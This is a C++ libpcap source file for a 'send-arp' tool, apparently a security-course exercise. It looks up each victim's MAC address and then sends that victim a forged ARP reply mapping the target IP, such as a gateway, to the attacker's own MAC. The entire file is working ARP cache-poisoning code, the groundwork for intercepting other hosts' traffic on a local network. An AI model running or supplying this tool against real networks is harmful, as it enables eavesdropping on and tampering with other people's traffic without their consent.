#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
//for getMAC, getIP
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/stat.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define REQUEST 1
#define REPLY 0

#define TRUE 1
#define FALSE 0

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void print_MAC(Mac mac) {
	printf("%02X:%02X:%02X:%02X:%02X:%02X\n", ((uint8_t*)mac)[0], ((uint8_t*)mac)[1], ((uint8_t*)mac)[2], ((uint8_t*)mac)[3], ((uint8_t*)mac)[4], ((uint8_t*)mac)[5]);
}

void print_IP(uint32_t ip){
	printf("%d.%d.%d.%d\n", (ip & 0xff000000) >> 24, (ip & 0x00ff0000)>>16, (ip & 0x0000ff00)>>8, (ip & 0x000000ff));
}

//from "https://indienote.tistory.com/755"
bool get_my_MAC(uint8_t* mac, char* dev) {
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return FALSE;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Failed to get MAC address");
        return FALSE;
    }

    for(int i = 0; i<6; i++){
    	mac[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sockfd);

    return TRUE;
}

//from "https://tjcplpllog.blogspot.com/2015/02/ip.html"
bool get_my_IP(uint32_t *ip, char *dev){
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Failed to create socket");
        return FALSE;
    }

    struct ifreq ifr;
    struct sockaddr_in * sin;
    strcpy(ifr.ifr_name, dev);

    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
        perror("Failed to get IP address");
        return FALSE;
    }
    sin = (struct sockaddr_in *)&ifr.ifr_addr;
    *ip = ntohl(sin->sin_addr.s_addr);

    close(sockfd);

    return TRUE;
}

void make_packet(EthArpPacket *packet, Mac smac_eth, Mac dmac_eth, Mac smac_ip, Mac tmac_ip, uint32_t sip, uint32_t tip, int r){
	packet->eth_.dmac_ = dmac_eth;
	packet->eth_.smac_ = smac_eth;
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	if(r){
		packet->arp_.op_ = htons(ArpHdr::Request);
	}
	else{
		packet->arp_.op_ = htons(ArpHdr::Reply);
	}
	packet->arp_.smac_ = smac_ip;
	packet->arp_.sip_ = htonl(sip);
	packet->arp_.tmac_ = tmac_ip;
	packet->arp_.tip_ = htonl(tip);
}

bool send_packet(pcap_t* handle, EthArpPacket* packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return FALSE;
	}
	return TRUE;
}

bool receive_packet(pcap_t* handle, Mac tmac_ip, uint32_t sip, uint32_t tip, Mac* smac_ip_out) {
	struct pcap_pkthdr* header;
	const u_char* packet;
	while(1) {
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return FALSE;
		}
		
		EthArpPacket* catched_packet = (EthArpPacket*)packet;
		
		if(ntohs(catched_packet->arp_.op_) != ArpHdr::Reply) continue;
		if(ntohl(catched_packet->arp_.sip_) != sip) continue;	
		if(ntohl(catched_packet->arp_.tip_) != tip) continue;
		int flag = 0;
		for(int i=0; i<6; i++) {
			if(((uint8_t*)(catched_packet->arp_.tmac_))[i] != ((uint8_t*)tmac_ip)[i]){
				 flag = 1;
				 break;	
			}
		}
		if (flag) continue;
		*smac_ip_out = Mac(catched_packet->arp_.smac_); 
		break;
	}
	return TRUE;
}

bool get_sender_MAC(pcap_t* handle, Mac my_mac, uint32_t my_ip, uint32_t sender_ip, Mac* sender_mac_out){
	EthArpPacket tmp_packet;
	make_packet(&tmp_packet, my_mac, Mac("FF:FF:FF:FF:FF:FF"), my_mac, Mac("00:00:00:00:00:00"), my_ip, sender_ip, REQUEST);

	//requst
	if(!send_packet(handle, &tmp_packet)){
		printf("send error for get sender MAC");
		return FALSE;
	}

	//reply
	if(!receive_packet(handle, my_mac, sender_ip, my_ip, sender_mac_out)){
		printf("receive error for get sender MAC");
		return FALSE;
	}

	return TRUE;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc % 2) != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	uint8_t my_mac_str[6];
	memset(my_mac_str, 0, sizeof(my_mac_str));
	uint32_t my_ip = 0;
	Mac my_mac;

	//get my mac addr
	if(!get_my_MAC(my_mac_str, dev)){
		printf("failed to get my mac address\n");
		return -1;
	}
	my_mac = Mac(my_mac_str);
	printf("my_mac : ");
	print_MAC(my_mac);

	//get my ip addr
	if(!get_my_IP(&my_ip, dev)){
		printf("failed to get my ip address\n");
		return -1;
	}
	printf("my_ip : ");
	print_IP(my_ip);

	for(int i = 2; i<argc; i+=2){
		uint32_t sender_ip = Ip(argv[i]);
		uint32_t target_ip = Ip(argv[i+1]);

		printf("========================\n");
		printf("sender_ip : ");
		print_IP(sender_ip);
		printf("target_ip : ");
		print_IP(target_ip);

		//get sender's MAC addr
		Mac sender_mac;
		if(!get_sender_MAC(handle, my_mac, my_ip, sender_ip, &sender_mac)){
			printf("failed to get sender's mac address\n");
			return -1;
		}
		printf("sender_mac : ");
		print_MAC(sender_mac);

		//send arp packet
		EthArpPacket reply_packet;
		make_packet(&reply_packet, my_mac, sender_mac, my_mac, sender_mac, target_ip, sender_ip, REPLY);
		send_packet(handle, &reply_packet);
	}

	pcap_close(handle);
}
